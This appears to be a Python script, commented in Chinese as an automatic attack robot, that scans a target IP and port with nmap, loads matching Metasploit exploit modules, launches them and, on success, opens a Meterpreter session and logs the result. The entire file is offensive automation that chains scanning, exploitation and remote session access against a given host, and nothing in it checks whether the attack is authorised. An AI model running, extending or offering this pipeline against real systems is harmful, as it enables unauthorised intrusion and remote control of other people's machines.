import getopt
from py_config import ConfigFactory
from py_logging import LoggerFactory
from py_metasploit import MetasploitClient
from py_scaner import Scanner
import sys

# 自动攻击机器人
config = ConfigFactory(config_file='py_robot2022.ini').get_config()
logger = LoggerFactory(config_factory=config).get_logger()

target_ip = '172.27.100.110'
target_port = 18080
try:
    print(sys.argv)
    opts, args = getopt.getopt(args=sys.argv[1:], shortopts='-h-v-i:-p:')
    print(opts)
    for opt_name, opt_value in opts:
        if opt_name in ['-h']:
            print('usage: py_robot2022 -i <target_ip> -p <target_port>')
            exit(code=0)
        if opt_name in ['-v']:
            print('py_robot2022 version 1.0.0')
            exit(code=0)
        if opt_name in ['-i']:
            target_ip = opt_value
        if opt_name in ['-p']:
            target_port = int(opt_value)

except getopt.GetoptError as error:
    logger.error(error)

# 初始化
scanner = Scanner(config=config, logger=logger)
metasploit_client = MetasploitClient(config=config, logger=logger)

# 使用nmap扫描端口
result = scanner.nmap(target_ip=target_ip, target_port=target_port)
logger.info(result)

# 如果nmap得到特征字
if len(result) > 0:
    for script_name in result:
        attack_script = metasploit_client.load_script(
            script_name=script_name, target_ip=target_ip, target_port=target_port)
        status, result = metasploit_client.attack(attack_script=attack_script)
        if status == 'success':
            status, result = metasploit_client.meterpreter()
            logger.info('status : %s' % status)
            logger.info('result : %s' % result)
else:
    result = 'failure'
